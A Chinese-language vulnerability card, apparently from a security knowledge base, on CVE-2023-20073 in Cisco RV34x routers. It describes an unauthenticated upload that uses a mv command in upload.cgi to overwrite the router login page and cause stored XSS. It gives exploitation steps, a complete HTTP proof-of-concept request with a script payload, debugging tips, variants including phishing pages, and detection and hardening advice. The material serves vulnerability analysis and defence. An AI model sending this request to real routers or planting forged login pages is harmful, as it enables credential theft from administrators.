---
id: iot-cisco-rv34x-unauth-upload-cgi-mv-login-xss
title: Cisco RV34X 未授权文件上传 + upload.cgi 拼 mv 覆盖 /www/login.html：路由器登录页存储型 XSS（CVE-2023-20073）
type: scenario
domain: iot
path: iot
technique: cisco-rv34x-unauth-upload-cgi-mv-overwrite-login-xss
tags:
- cisco
- rv34x
- router
- file-upload
- unauthenticated
- upload-cgi
- stored-xss
- firmware
- cve-2023-20073
cve:
- CVE-2023-20073
severity: high
confidence: high
affected_versions: Cisco RV340 / RV340W / RV345 / RV345P（固件 1.0.03.29 为原文复现版本；原文称当时最新固件均受影响）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V268
  verified_at: '2026-11-07T18:53:18+08:00'
  notes: 已对照原文与32张图核对。版本核对：图01 Cisco 下载页显示 Latest Release 1.0.03.29、文件为 RV340/RV340W/RV345/RV345P 共用固件（Release Date 17-Nov-2022），解包路径与 IMG 文件名均为 RV34X-v1.0.03.29-2022-10-17；原文称四款当时最新固件均受影响，affected_versions 按此标注（1.0.03.29 为原文复现版本，非修复版本声明）。技术链核对：rest.url.conf 仅判断 $http_authorization 非空（图14）；web.upload.conf 的 /upload 校验 token/sessionid（图16）；upload.ini cgi=/www/cgi-bin/upload.cgi 且 uid=www-data（图18）；main 从表单取 file.path/pathparam/fileparam（图21），sub_115EC 按 Portal→/tmp/www/ 映射并拼 mv -f（图20），gdb 确认 mv -f /tmp/upload/000000008 /tmp/www//login.html（图30）；login.html 被篡改为 XSS 弹窗（图31/32）。卡片明确最终为存储型 XSS/登录页篡改而非任意命令执行，符合原文。dedup 候选均为不同上传/XSS/IoT 链（new）；dup-scan 无涉及本篇 pair。未执行 PoC。
url: /docs/iot/iot-cisco-rv34x-unauth-upload-cgi-mv-login-xss/
draft: false
kb_aliases:
- CVE-2023-20073
- Cisco RV340 文件上传
- RV34X 未授权上传
- upload.cgi mv 覆盖
- 路由器登录页篡改
- 存储型 XSS 路由器
---

## 一句话结论

Cisco RV340/RV340W/RV345/RV345P 的 Nginx 上传路由 `/api/operations/ciscosb-file:form-file-upload` 只要求 `Authorization` 头非空而不校验其内容，未授权即可把文件写入 `/tmp/upload`；随后 uWSGI 调起的 `upload.cgi` 用表单里的 `pathparam`/`fileparam` 拼出 `mv -f <上传文件> /tmp/www/<文件名>` 并交给 `system()` 执行，而 `/www/login.html` 是指向 `/tmp/www/login.html` 的软链接，因此攻击者能覆盖路由器登录页，形成存储型 XSS。

## 原理

- **Nginx 层的“假鉴权”**：`/etc/nginx/conf.d/rest.url.conf` 中 `location /api/operations/ciscosb-file:form-file-upload` 的逻辑是 `if ($http_authorization != "") { set $deny 0; }`，只有 `Authorization` 为空才返回 403；任意非空字符串（如 `1`）即可通过。随后 `upload_pass /form-file-upload`、`upload_store /tmp/upload`，由 nginx upload 模块把文件落盘，再把 `$upload_file_name`、`$upload_tmp_path` 等字段转给后端。
- **后端链路**：`/form-file-upload` 通过 `uwsgi_pass 127.0.0.1:9003` 交给 `upload.ini` 启动的 CGI 进程，`cgi = /www/cgi-bin/upload.cgi`，以 `www-data` 身份运行。
- **upload.cgi 的参数**：`main` 用 `jsonutil_get_string` 从表单中取 `file.path`（上传临时路径）、`filename`、`pathparam`、`fileparam` 等；随后调用 `sub_115EC(a1=pathparam, a2=file.path, a3=fileparam)`。
- **目录映射**：`sub_115EC` 用 `strcmp` 把 `a1` 映射到固定目录：`Firmware→/tmp/firmware`、`Configuration→/tmp/configuration`、`Certificate→/tmp/in_certs`、`Signature→/tmp/signature`、`3g-4g-driver→/tmp/3g-4g-driver`、`Language-pack→/tmp/language-pack`、`User→/tmp/user`，`Portal→/tmp/www/`。
- **命令拼接**：检查 `is_file_exist(a2)` 为真、`a3` 长度不超过 0x80 且匹配 `^[a-zA-Z0-9_.]+$` 后，执行 `sprintf(s, "mv -f %s %s/%s", a2, v8, a3); system(s);`。`a2` 是上传模块生成的 `/tmp/upload/<数字>`，`a3=login.html` 合法，最终命令为 `mv -f /tmp/upload/000000008 /tmp/www//login.html`。
- **为什么能改登录页**：固件中 `/www/login.html` 软链接到 `/tmp/www/login.html`，而 `Portal` 的 `v8` 正是 `/tmp/www/`；`mv` 把上传内容写到软链接目标，`/login.html` 随即可被浏览器访问，内容中的 `<script>` 在受害者（管理员）浏览器执行。整个过程中没有校验上传内容类型，也没有把登录页放在只读分区。
- **影响边界**：该链最终是存储型 XSS/登录页篡改，而不是任意命令执行——`a3` 受文件名字符白名单限制，`a2` 是上传模块生成的路径，`system()` 的拼接不足以直接注入 shell 元字符。攻击者可借此窃取管理员凭据或在管理员会话中执行操作。

## 触发条件

- 目标为 Cisco RV340/RV340W/RV345/RV345P，固件存在该上传路由（文章测试 1.0.03.29）。
- 能访问路由器 HTTPS 管理端口（文章为 `https://<IP>/`）。
- 请求带任意非空 `Authorization` 头即可通过 API 路由鉴权；无需登录态（`Cookie: sessionid=abc` 也可随便填）。
- 后端 `upload.cgi` 正常由 uWSGI 拉起（默认随 nginx 启动），`/www/login.html` 为指向 `/tmp/www/login.html` 的软链接。
- 上传体需包含 `pathparam=Portal`、`fileparam=login.html` 及对应的 `file` 文件字段。

## 利用步骤

1. 构造 `multipart/form-data` POST 到 `https://<router-ip>/api/operations/ciscosb-file:form-file-upload`，设置 `Authorization: 1`、`Cookie: sessionid=abc`。
2. 表单中放入 `pathparam=Portal`，决定目标目录 `/tmp/www/`；放入 `fileparam=login.html`，决定目标文件名；再放入一个 `name="file"`、`filename="login.html"` 的文件字段，内容为伪造的登录页 HTML/JS。文章请求体中出现两组 `fileparam` + `file` 字段，按原样保留可提高成功复现率。
3. 发送请求；nginx upload 模块把文件存为 `/tmp/upload/<数字>`，`upload.cgi` 执行 `mv -f /tmp/upload/<数字> /tmp/www//login.html`。HTTP 响应可能是 `Error Input`，但 `mv` 已在 `system()` 中完成。
4. 在浏览器访问 `https://<router-ip>/login.html`，确认页面已被替换、脚本执行（文章弹出 `Hacked by XiDP!`）。
5. 若要恢复，重启路由器或恢复 `/tmp/www/login.html`。
6. 变体：把 `pathparam` 换成 `Firmware`/`Configuration`/`Certificate`/`Signature`/`3g-4g-driver`/`Language-pack`/`User` 可写入对应固定目录，但只有 `Portal` 落在 Web 可访问的 `/tmp/www/`。

## PoC

请求骨架（`Authorization` 任意非空，boundary 可自定义；文件内容为伪造登录页）：

```http
POST /api/operations/ciscosb-file:form-file-upload HTTP/1.1
Host: 192.168.52.128
Authorization: 1
Cookie: sessionid=abc
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="fileparam"

login.html
------X
Content-Disposition: form-data; name="file"; filename="login.html"
Content-Type: application/octet-stream

<title>Hacked</title><script>alert(document.domain)</script>
------X
Content-Disposition: form-data; name="pathparam"

Portal
------X
Content-Disposition: form-data; name="fileparam"

login.html
------X
Content-Disposition: form-data; name="file"; filename="login.html"
Content-Type: application/octet-stream

<title>Hacked</title><script>alert(document.domain)</script>
------X--
```

调试/验证要点（文章复现环境）：

- `upload.cgi` 在 IDA 中位于 `sub_115EC`，`system` 前可下断点看到 `mv -f /tmp/upload/000000008 /tmp/www//login.html`。
- `upload.cgi` 由 uWSGI 拉起，需以 `www-data` 运行；若手工替换成 root 属主的文件，`mv` 后的文件权限/属主会变化，可能影响复现。
- 静态分析时可把 `0x10E0C` 的 `BL getenv` patch 成 `BL 0x10E0C` 制造死循环，便于 gdbserver 附加；动态调试前需把 `cgi-timeout` 调大。

## 变体与关联

- 变体：`pathparam` 取其他固定目录名可写入 `/tmp/firmware`、`/tmp/configuration` 等；若后续有服务从这些目录读取配置/证书，可能扩展为配置篡改或证书替换，但文章未验证。
- 变体：利用同一未授权上传把其他 Web 资源（如 JS/CSS/HTML 片段）写入 `/tmp/www/`，可组合出更隐蔽的钓鱼页或持久化脚本。
- 关联：[[web-generic-file-upload-html-static-stored-xss]]（任意 HTML 上传到静态目录 → 存储型 XSS 的通用模式）；[[web-generic-file-upload-unauth-file-management-upload-read-delete]]（未授权上传接口的通用面）。
- 关联：[[code-analysis-reverse-firmware-arm32-qemu-user-chroot-patch-br0]] 与 [[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（本类路由器固件解包与 QEMU 仿真方法）。

## 检测与防御

- **修复**：升级到 Cisco 修复版本；不要仅以 `Authorization` 非空作为鉴权条件，必须校验令牌/会话。
- **代码/配置层**：对上传接口做真实鉴权与 CSRF 防护；限制上传文件类型与内容；不要把用户可控文件名/路径拼进 `system()`，改用 `rename()`/`mv` 的参数化调用或直接写目标路径；登录页等静态资源放在只读分区，不通过可写软链接提供服务。
- **检测**：监控 `/tmp/upload` 出现新文件后紧跟 `mv` 到 `/tmp/www/` 的进程行为；检查 `upload.cgi` 的请求体是否含 `pathparam=Portal`、`fileparam=login.html`；对管理页面 `/login.html` 的内容哈希做完整性校验。
- **加固**：管理面仅在内网开放；启用登录页完整性监控与浏览器端 SRI/CSP（虽不能阻止服务端篡改，但可降低脚本执行面）。
